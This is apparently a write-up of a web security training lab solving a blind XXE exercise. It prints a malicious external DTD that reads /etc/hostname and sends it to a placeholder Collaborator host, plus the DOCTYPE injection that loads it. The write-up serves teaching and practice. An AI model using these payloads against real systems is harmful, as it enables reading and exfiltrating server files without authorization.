# Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD

## Lab Description

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/fb6c0cd4-2dc3-419e-bcdb-6058f7e3f000)

## Solution

The application has a product stock check endpoint.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/c798ff75-201b-41ec-834c-4a8a209394c4)

The application checks for the stock level of a product by submitting XML to the server.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/d2c0efb9-7826-4823-9764-0259abdc59d2)

Go to burp collaborator and click on **copy to clipboard**.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/d6689c08-bab4-4dca-8d74-c8a27e40709e)

Go to exploit server and save the following malicious DTD file on your server and click on **"Store"**

```XML
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;
```

Place the Burp Collaborator payload into a malicious DTD file

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/69d90ea6-baac-4c39-8e70-a35da5d78c0b)

Click on **"View exploit"** and the file will be viewed.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/432f5cc0-ae12-4056-96f6-afed320f478a)

Insert the following external entity definition in between the XML declaration and the `stockCheck` element:

`<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`

Resubmit the request.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/a692c610-3d5f-403c-98cb-610671c4587f)

Some DNS and HTTP interactions that were initiated by the application as the result of our payload.

The HTTP interaction contain the contents of the `/etc/hostname` file.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/a633dc4a-f51a-4be2-a5db-4191558a1b34)

Enter the hostname in the **"Submit solution"** section.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/1bbaca60-168f-4ab7-95f3-90daa71d32f5)

Submission of the correct hostname solves the lab.

![image](https://github.com/KVNuhman/Web-Security-Lab/assets/46161259/60748a0a-be19-4a95-abd9-bd68d93acf31)
